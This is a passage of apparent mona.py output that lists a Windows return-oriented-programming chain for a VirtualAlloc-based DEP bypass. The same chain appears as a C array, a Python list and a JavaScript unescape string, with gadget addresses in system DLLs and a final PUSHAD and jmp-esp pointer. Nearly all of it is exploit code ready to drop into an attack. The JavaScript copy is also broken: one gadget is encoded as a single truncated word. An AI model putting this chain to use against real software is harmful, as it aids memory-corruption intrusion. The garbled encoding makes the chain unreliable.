      0x77c4e392,  // POP EAX // RETN [msvcrt.dll] 
      0xa2800fc0,  // put delta into eax (-> put 0x00001000 into edx)
      0x7c87fa01,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x77f124c8,  // XCHG EAX,EDX // RETN [GDI32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      //[---INFO:gadgets_to_set_ecx:---]
      0x77eed7a5,  // POP EAX // RETN [RPCRT4.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x77eda3d7,  // NEG EAX // RETN [RPCRT4.dll] 
      0x77c13ffd,  // XCHG EAX,ECX // RETN [msvcrt.dll] 
      //[---INFO:gadgets_to_set_edi:---]
      0x7c90e7db,  // POP EDI // RETN [ntdll.dll] 
      0x77e8d224,  // RETN (ROP NOP) [RPCRT4.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x7c87f318,  // POP EAX // RETN [kernel32.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x77e33da2,  // PUSHAD // RETN [ADVAPI32.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77c42ebc,  # POP ECX # RETN [msvcrt.dll] 
      0x77dd121c,  # ptr to &VirtualAlloc() [IAT ADVAPI32.dll]
      0x7e45615d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.DLL] 
      0x7c94d192,  # XCHG EAX,ESI # RETN [ntdll.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c53113,  # POP EBP # RETN [msvcrt.dll] 
      0x77f31d2f,  # & jmp esp [GDI32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x77e8d222,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77df560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x77c4e392,  # POP EAX # RETN [msvcrt.dll] 
      0xa2800fc0,  # put delta into eax (-> put 0x00001000 into edx)
      0x7c87fa01,  # ADD EAX,5D800040 # RETN 0x04 [kernel32.dll] 
      0x77f124c8,  # XCHG EAX,EDX # RETN [GDI32.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      #[---INFO:gadgets_to_set_ecx:---]
      0x77eed7a5,  # POP EAX # RETN [RPCRT4.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77eda3d7,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c13ffd,  # XCHG EAX,ECX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c90e7db,  # POP EDI # RETN [ntdll.dll] 
      0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x7c87f318,  # POP EAX # RETN [kernel32.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77e33da2,  # PUSHAD # RETN [ADVAPI32.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u2ebc%u77c4" + // 0x77c42ebc : ,# POP ECX # RETN [msvcrt.dll] 
    "%u121c%u77dd" + // 0x77dd121c : ,# ptr to &VirtualAlloc() [IAT ADVAPI32.dll]
    "%u615d%u7e45" + // 0x7e45615d : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.DLL] 
    "%ud192%u7c94" + // 0x7c94d192 : ,# XCHG EAX,ESI # RETN [ntdll.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u3113%u77c5" + // 0x77c53113 : ,# POP EBP # RETN [msvcrt.dll] 
    "%u1d2f%u77f3" + // 0x77f31d2f : ,# & jmp esp [GDI32.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%ub860%u77c3" + // 0x77c3b860 : ,# POP EAX # RETN [msvcrt.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%ud222%u77e8" + // 0x77e8d222 : ,# NEG EAX # RETN [RPCRT4.dll] 
    "%udf56" + // 0x77df560a : ,# XCHG EAX,EBX # RETN [ADVAPI32.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%ue392%u77c4" + // 0x77c4e392 : ,# POP EAX # RETN [msvcrt.dll] 
    "%u0fc0%ua280" + // 0xa2800fc0 : ,# put delta into eax (-> put 0x00001000 into edx)
    "%ufa01%u7c87" + // 0x7c87fa01 : ,# ADD EAX,5D800040 # RETN 0x04 [kernel32.dll] 
    "%u24c8%u77f1" + // 0x77f124c8 : ,# XCHG EAX,EDX # RETN [GDI32.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%ud7a5%u77ee" + // 0x77eed7a5 : ,# POP EAX # RETN [RPCRT4.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%ua3d7%u77ed" + // 0x77eda3d7 : ,# NEG EAX # RETN [RPCRT4.dll] 
    "%u3ffd%u77c1" + // 0x77c13ffd : ,# XCHG EAX,ECX # RETN [msvcrt.dll] 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%ue7db%u7c90" + // 0x7c90e7db : ,# POP EDI # RETN [ntdll.dll] 
    "%ud224%u77e8" + // 0x77e8d224 : ,# RETN (ROP NOP) [RPCRT4.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%uf318%u7c87" + // 0x7c87f318 : ,# POP EAX # RETN [kernel32.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u3da2%u77e3" + // 0x77e33da2 : ,# PUSHAD # RETN [ADVAPI32.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

